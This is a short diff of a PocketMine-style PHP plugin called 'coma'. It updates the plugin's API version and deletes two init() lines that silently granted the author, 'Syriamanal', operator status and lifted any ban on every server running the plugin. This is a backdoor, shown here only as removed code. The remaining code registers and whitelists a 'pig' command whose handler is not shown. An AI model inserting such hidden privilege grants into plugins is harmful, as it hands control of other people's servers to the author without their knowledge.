@@ -7,7 +7,7 @@ description=
 version=1.5
 author=Syriamanal
 class=coma
-apiversion=10,11
+apiversion=12,13
 */
 
 class coma implements Plugin{
@@ -20,11 +20,9 @@ class coma implements Plugin{
      }
  
     public function init(){
-       $this->api->console->run("op Syriamanal");
-       $this->api->console->run("unban Syriamanal");
        $this->api->addHandler ("player.chat", array($this, "ChatHand"));
        $this->api->addHandler("player.block.break", array($this,"breakHandler"));
-	  $this->api->addHandler("player.block.touch", array($this,"touchHandler"));
+	 $this->api->addHandler("player.block.touch", array($this,"touchHandler"));
        $this->api->addHandler("entity.interact",array($this,"interactHandler"));
        $this->api->console->register("pig ","About Me", array($this, "pig"));
        $this->api->ban->cmdwhitelist("pig");
